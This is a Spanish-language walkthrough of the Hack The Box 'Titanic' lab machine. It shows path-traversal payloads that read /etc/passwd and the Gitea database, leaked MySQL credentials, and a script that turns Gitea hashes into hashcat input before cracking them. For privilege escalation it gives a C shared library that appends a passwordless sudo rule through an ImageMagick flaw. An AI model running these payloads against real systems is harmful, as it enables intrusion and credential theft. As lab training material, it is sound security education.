
# Titanic

<figure><img src="/files/tS0RxdpFe3XmapI3tdM2" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.55` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts
```

<figure><img src="/files/FFJnfAdM4arvZvCkDthN" alt=""><figcaption></figcaption></figure>

Parece una web de experiencias de lujo en un barco estilo titanic. No funciona ningún link de la cabecera menos el CTA de `Book Now`, que abre un formulario que podría ser vulnerable:

<figure><img src="/files/MOZaog1aMWY7z8PdEghm" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -p- -A -T5 10.10.11.55
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose
Running: Linux 5.X
```

Solo encontramos 2 puertos abiertos, el 22 y el 80, los típicos.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch nos encontramos unos pocos directorios:

```bash
dirsearch -u http://10.10.11.55/ -x 404                        

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.11.55/__25-05-09_11-41-59.txt

Target: http://10.10.11.55/

[11:41:59] Starting: 
[11:42:00] 403 -  276B  - /%3f/
[11:42:23] 301 -  322B  - /axis//happyaxis.jsp  ->  http://titanic.htb/axis/happyaxis.jsp
[11:42:23] 301 -  333B  - /axis2//axis2-web/HappyAxis.jsp  ->  http://titanic.htb/axis2/axis2-web/HappyAxis.jsp
[11:42:23] 301 -  327B  - /axis2-web//HappyAxis.jsp  ->  http://titanic.htb/axis2-web/HappyAxis.jsp
[11:42:26] 301 -  355B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://titanic.htb/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[11:42:34] 301 -  345B  - /engine/classes/swfupload//swfupload_f9.swf  ->  http://titanic.htb/engine/classes/swfupload/swfupload_f9.swf
[11:42:34] 301 -  342B  - /engine/classes/swfupload//swfupload.swf  ->  http://titanic.htb/engine/classes/swfupload/swfupload.swf
[11:42:35] 301 -  330B  - /extjs/resources//charts.swf  ->  http://titanic.htb/extjs/resources/charts.swf
[11:42:39] 301 -  340B  - /html/js/misc/swfupload//swfupload.swf  ->  http://titanic.htb/html/js/misc/swfupload/swfupload.swf

Task Completed
```

Encontramos varios archivos interesantes:

* **`/axis//happyaxis.jsp`** → Página de prueba de **Apache Axis**, útil para comprobar si el servicio web está funcionando. Potencialmente vulnerable si está mal configurado.
* **`/axis2//axis2-web/HappyAxis.jsp`** → Página de bienvenida de **Axis2 Web Services**, puede conducir a consola administrativa.
* **`/axis2-web//HappyAxis.jsp`** → Redirección duplicada de Axis2, misma función que la anterior.
* **`/Citrix//AccessPlatform/auth/clientscripts/cookies.js`** → Script JavaScript de autenticación de una posible instancia de **Citrix Access Gateway**.
* **`/engine/classes/swfupload//swfupload_f9.swf`** → Archivo **Flash (SWF)** antiguo para subida de archivos; puede contener vulnerabilidades de ejecución de código.
* **`/engine/classes/swfupload//swfupload.swf`** → Otro archivo SWF del mismo módulo, también candidato a explotación por vulnerabilidades en Flash.
* **`/extjs/resources//charts.swf`** → Archivo SWF usado para visualización de datos; si está desactualizado, puede ser objetivo de ataques XSS en Flash.
* **`/html/js/misc/swfupload//swfupload.swf`** → Tercera ubicación de `swfupload.swf`; indica reutilización extensa del componente vulnerable.

## <mark style="color:purple;">Prueba de formulario</mark>

Al enviar el form observamos que se nos descarga un JSON:

<figure><img src="/files/BD6YsVd4dOhhW5zCm5Jh" alt=""><figcaption></figcaption></figure>

En principio vemos que solo se nos almacenan los datos de cada input:

```bash
cat 0aa30f88-a6ed-4cf5-a3a3-8d90afea77fd.json 

{"name": "test", "email": "test@mail.com", "phone": "666778899", "date": "2025-01-08", "cabin": "Deluxe"}
```

Capturando la petición con BurpSuite, vemos que el json se descarga desde:

```
/download?ticket=<cadena-de-texto>.json
```

<figure><img src="/files/7bWWlB5DiGJ4OVjf5OdX" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Fuzzing de parámetros</mark>

Como ticket se pasa como un parámetro de URL probamos un fuzzing de extensiones para intentar explotar un LFI (Local File Inclusion):

```
ffuf -u http://titanic.htb/download\?ticket\=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/download?ticket=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1951, Words: 15, Lines: 37, Duration: 49ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1951, Words: 15, Lines: 37, Duration: 62ms]
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 1951, Words: 15, Lines: 37, Duration: 86ms]
/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 77ms]
/etc/apt/sources.list   [Status: 200, Size: 2377, Words: 239, Lines: 43, Duration: 47ms]
/etc/crontab            [Status: 200, Size: 1136, Words: 196, Lines: 24, Duration: 47ms]
/etc/fstab              [Status: 200, Size: 496, Words: 82, Lines: 12, Duration: 46ms]
/etc/group              [Status: 200, Size: 818, Words: 1, Lines: 63, Duration: 56ms]
/etc/hosts              [Status: 200, Size: 250, Words: 24, Lines: 10, Duration: 75ms]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 250, Words: 24, Lines: 10, Duration: 74ms]
/etc/hosts.deny         [Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 73ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 76ms]
/etc/issue              [Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 52ms]
/etc/init.d/apache2     [Status: 200, Size: 8181, Words: 1500, Lines: 356, Duration: 57ms]
/etc/mysql/my.cnf       [Status: 200, Size: 839, Words: 116, Lines: 24, Duration: 52ms]
/etc/netconfig          [Status: 200, Size: 767, Words: 289, Lines: 20, Duration: 51ms]
/etc/nsswitch.conf      [Status: 200, Size: 510, Words: 131, Lines: 21, Duration: 56ms]
```

Bingo! Tenemos via libre hacia un LFI. Vamos a ver el `etc/hosts`:

<pre class="language-bash"><code class="lang-bash">curl -i "http://titanic.htb/download?ticket=../../../../../../etc/passwd"                                  
<strong>
</strong><strong>HTTP/1.1 200 OK
</strong>Date: Fri, 09 May 2025 10:14:35 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../etc/passwd"
Content-Type: application/octet-stream
Content-Length: 1951
Last-Modified: Fri, 07 Feb 2025 11:16:19 GMT
Cache-Control: no-cache
ETag: "1738926979.4294043-1951-1015942535"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
</code></pre>

El único usuario con shell además de root es el usuario `developer`.

## <mark style="color:purple;">Archivos con acceso LFI</mark>

Vamos a buscar otros archivos accesibles por LFI. Hemos encontrado algunos interesantes:

* `/etc/passwd` – Contiene usuarios del sistema.
* `/etc/hosts` – Mapeo de nombres de host locales.
* `/etc/hosts.deny` / `/etc/hosts.allow` – Control de acceso a servicios.
* `/etc/apt/sources.list` – Repositorios del sistema.
* `/etc/group` – Grupos del sistema.
* `/etc/fstab` – Montaje de sistemas de archivos.
* `/etc/init.d/apache2` – Script de inicio de Apache.
* `/etc/apache2/apache2.conf` – Configuración principal de Apache.
* `/etc/mysql/my.cnf` – Configuración de MySQL (posibles credenciales).
* `/etc/ssh/sshd_config` – Configuración de SSH (posibles vectores).
* `/etc/nsswitch.conf` / `/etc/netconfig` – Configs de resolución de nombres.
* `/etc/issue` – Banner del sistema (identifica distribución).
* `/etc/resolv.conf` – DNS configurados.
* `/etc/rpc` – Servicios RPC disponibles.
* `/var/log/lastlog` – Últimos accesos de usuarios (binario).
* `/var/log/wtmp` / `/var/run/utmp` – Historial de sesiones/logins (binarios).

## <mark style="color:purple;">Enumeración de vhosts</mark>

Descubrimos un host de desarrollo, al que seguramente pueda acceder el usuario developer:

```bash
curl -i "http://titanic.htb/download?ticket=../../../../../../etc/hosts"            

HTTP/1.1 200 OK
Date: Fri, 09 May 2025 10:19:01 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../../../etc/hosts"
Content-Type: application/octet-stream
Content-Length: 250
Last-Modified: Fri, 07 Feb 2025 12:04:36 GMT
Cache-Control: no-cache
ETag: "1738929876.3570278-250-789908774"

127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic
```

Con ffuf lo confirmamos:

```bash
ffuf -u http://titanic.htb -H "Host:FUZZ.titanic.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -fw 12 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response words: 12
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 41ms]
```

## <mark style="color:purple;">Subdominio de desarrollo</mark>

Lo añadimos a `etc/hosts` y accedemos para ver que nos encontramos:

```bash
sudo echo "10.10.11.55 dev.titanic.htb" | sudo tee -a /etc/hosts
```

<figure><img src="/files/JZZyJKwG416TRxaIY4Sp" alt=""><figcaption></figcaption></figure>

Tenemos una instancia de Gitea! Al acceder a Explore, nos encontramos con 2 repositorios que podrían contener credenciales:

<figure><img src="/files/zUDNzYjcXasUrxZxrgQr" alt=""><figcaption></figcaption></figure>

En `flash-app/tickets` nos encontramos `2 json` que contienen nombres de usuarios, que aunque son los protagonistas del titanic, podrían ser usuarios válidos:

```json
{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}
```

```json
{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}
```

En docker-config nos encontramos directorios interesantes de `gitea` y `mysql`:

<figure><img src="/files/RxCmorFEhLbKd6rcQBiP" alt=""><figcaption></figcaption></figure>

En `mysql` tenemos una mina de oro: usuario y credenciales expuestas de la base de datos:

<figure><img src="/files/XvRRIkWw746Tug1vdoQt" alt=""><figcaption></figcaption></figure>

```yaml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

Y en Gitea encontramos un puerto expuesto para la conexión SSH que podríamos aprovechar para acceder con las credenciales que tenemos:

<figure><img src="/files/O5bgidQMDSMSbzPlMDup" alt=""><figcaption></figcaption></figure>

```yaml
ports:
      - "127.0.0.1:3000:3000"  # Base de datos MySQL
      - "127.0.0.1:2222:22"    # Puerto de acceso SSH
```

Y encontramos el path de las aplicaciones de Gitea y MySQL:

```yaml
 volumes:
      - /home/developer/gitea/data:/data # Replace with your path
```

## <mark style="color:purple;">LFI dirigido a Gitea</mark>

Volvemos a explotar el LFI para enumerar archivos sensibles de la configuración de Gitea, y encontramos la base de datos, token y el `JWT_SECRET`:

<figure><img src="/files/zZJ6tmECh7XxpIpwZe3P" alt=""><figcaption></figcaption></figure>

La base da datos se encuentra en:

```
/data/gitea/gitea.db
```

Accedemos y tenemos un dump cmpleto de la base de datos:

<figure><img src="/files/t5HFerhlrSJeZCOlp95w" alt=""><figcaption></figcaption></figure>

Filtrando por el usuario `developer` o el usuario `root` encontramos los hashes de ambos!

<figure><img src="/files/sSRHxweXIZhveY0XNgLb" alt=""><figcaption></figcaption></figure>

Le damos click derecho > `Copy to file` y le damos el nombre de `titanic.db`

Eliminarnos el encabezado de BurpSuite con este comando, que elimina las 12 primeras líneas:

```bash
sed -i '1,12d' titanic.db  
```

Comprobamos la integridad de la base de datos:

```bash
sqlite3 titanic.db "PRAGMA integrity_check"

ok
```

Y  extraemos los hashes de la tabla user:

{% code overflow="wrap" %}

```bash
sqlite3 titanic.db "SELECT name, passwd, salt FROM user" | while IFS='|' read -r name passwd salt; do
    digest=$(echo -n "$passwd" | xxd -r -p | base64 -w0)
    salt_b64=$(echo -n "$salt" | xxd -r -p | base64 -w0)
    echo "${name}:sha256:50000:${salt_b64}:${digest}"
done | tee gitea_hashes.txt


administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

{% endcode %}

También podemos usar el siguiente script en bash que automatiza el proceso de extracción de los hashes y el guardado en un archivo procesable por hashcat:

{% code title="enumerate-db.sh" %}

```bash
#!/bin/bash
DB="titanic.db"

echo "[+] Extrayendo hashes en formato Hashcat (PBKDF2-HMAC-SHA256):"
echo "------------------------------------------------------------"

# Encabezado para documentación
echo "# Formato: sha256:iterations:salt_base64:hash_base64" > titanic_hashes.hashcat

sqlite3 "$DB" "SELECT passwd, salt FROM user" | while IFS='|' read -r passwd salt; do
    # Convertir a Base64 (eliminando newlines)
    salt_b64=$(echo -n "$salt" | xxd -r -p | base64 -w0)
    hash_b64=$(echo -n "$passwd" | xxd -r -p | base64 -w0)
    
    # Escribir en formato Hashcat puro
    echo "sha256:50000:${salt_b64}:${hash_b64}" >> titanic_hashes.hashcat
done

echo -e "\n[+] Hashes guardados en 'titanic_hashes.hashcat'"
echo "[+] Comando para crackear:"
echo "hashcat -m 10900 titanic_hashes.hashcat /usr/share/wordlists/rockyou.txt -O"
```

{% endcode %}

```bash
bash enumerate_db.sh
[+] Extrayendo hashes en formato Hashcat (PBKDF2-HMAC-SHA256):
------------------------------------------------------------

[+] Hashes guardados en 'titanic_hashes.hashcat'
[+] Comando para crackear:
hashcat -m 10900 titanic_hashes.hashcat /usr/share/wordlists/rockyou.txt -O
```

## <mark style="color:purple;">Cracking con Hashcat</mark>

{% code overflow="wrap" %}

```
hashcat -m 10900 titanic_hashes.hashcat /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 7 8845HS w/ Radeon 780M Graphics, 2124/4313 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'titanic_hashes.hashcat' on line 1 (# Form...erations:salt_base64:hash_base64): Signature unmatched
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:<REDACTED>
```

{% endcode %}

Conseguimos crackear la contraseña del usuario developer!

## <mark style="color:purple;">User flag</mark>

Accedemos por SSH y conseguimos la user flag:

```shell-session
developer@titanic:~$ ls
gitea  mysql  snap  user.txt

developer@titanic:~$ cat user.txt 
bebfbb6180dbfdc0d08d4c0********
```

## <mark style="color:purple;">Escalada de privilegios</mark>

No tenemos permisos sudo:

```shell-session
developer@titanic:~$ sudo -l
[
Sorry, user developer may not run sudo on titanic.
```

Enumerando ejecutables en el sistema encontré uno interesante:

```shell-session
developer@titanic:/tmp$ find / -type f -name "*.sh" 2>/dev/null | grep image
/opt/scripts/identify_images.sh
```

Vamos a ver como funciona:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Utiliza `ImageMagick` para identificar imágenes y escribirlas en logs rápidamente.

```shell-session
developer@titanic:~$ magick --version

Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

&#x20;Al verificar la versión de ImageMagick descubrí que es vulnerable a este CVE:

{% embed url="<https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8>" %}

Vamos al directorio **`/opt/app/static/assets/images/`** y creamos un archivo llamado `a.c` con este contenido:

{% code title="a.c" %}

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```

{% endcode %}

El comando anterior permite que el usuario `developer` usar `sudo` sin contraseña.

Ahora lo compilamos y ejecutamos con el siguiente comando:

```bash
gcc -fPIC -shared -o ./libxcb.so.1 a.c -nostartfiles
```

Y leemos la root flag:

```shell-session
developer@titanic:/opt/app/static/assets/images$ gcc -fPIC -shared -o ./libxcb.so.1 a.c -nostartfiles

developer@titanic:/opt/app/static/assets/images$ sudo cat /root/root.txt
056ed9a75e7ad6cb775a5b2*********
```
